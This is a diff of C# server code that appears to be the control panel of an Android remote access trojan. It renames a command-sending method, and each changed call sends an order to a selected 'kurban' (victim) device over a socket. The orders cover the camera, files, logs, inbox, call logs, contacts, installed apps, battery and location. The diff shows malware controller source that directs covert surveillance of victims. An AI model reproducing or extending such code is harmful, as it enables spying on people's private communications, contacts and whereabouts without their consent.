@@ -106,7 +106,7 @@ namespace Server.Views
                 }
             }
         }
-        public static async void KomutGonder(string tag, string mesaj, Socket client)
+        public static async void GoToOurSocket(string tag, string mesaj, Socket client)
         {
             try
             {
@@ -582,7 +582,7 @@ namespace Server.Views
             {
                 if (kurban.id == listView1.SelectedItems[0].Text)
                 {
-                    KomutGonder("CAMHAZIRLA", "[VERI][0x09]", kurban.socket);
+                    GoToOurSocket("CAMHAZIRLA", "[VERI][0x09]", kurban.socket);
                     /*
                     Kamera msj = new Kamera(kurban.soket, kurban.id);
                     msj.Show();
@@ -598,7 +598,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("DOSYA", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("DOSYA", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -639,7 +639,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("LOGLARIHAZIRLA", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("LOGLARIHAZIRLA", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -816,7 +816,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("GELENKUTUSU", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("GELENKUTUSU", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -829,7 +829,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("CALLLOGS", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("CALLLOGS", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -843,7 +843,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("VOLUMELEVELS", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("VOLUMELEVELS", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -857,7 +857,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("REHBERIVER", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("REHBERIVER", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -885,7 +885,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("APPLICATIONS", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("APPLICATIONS", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -899,7 +899,7 @@ namespace Server.Views
                 {
                     if (kurban.id == listView1.SelectedItems[0].Text)
                     {
-                        KomutGonder("SARJ", "[VERI][0x09]", kurban.socket);
+                        GoToOurSocket("SARJ", "[VERI][0x09]", kurban.socket);
                     }
                 }
             }
@@ -920,7 +920,7 @@ namespace Server.Views
             {
                 if (kurban.id == listView1.SelectedItems[0].Text)
                 {
-                    KomutGonder("KONUM", "[VERI][0x09]", kurban.socket);
+                    GoToOurSocket("KONUM", "[VERI][0x09]", kurban.socket);
                 }
             }
         }
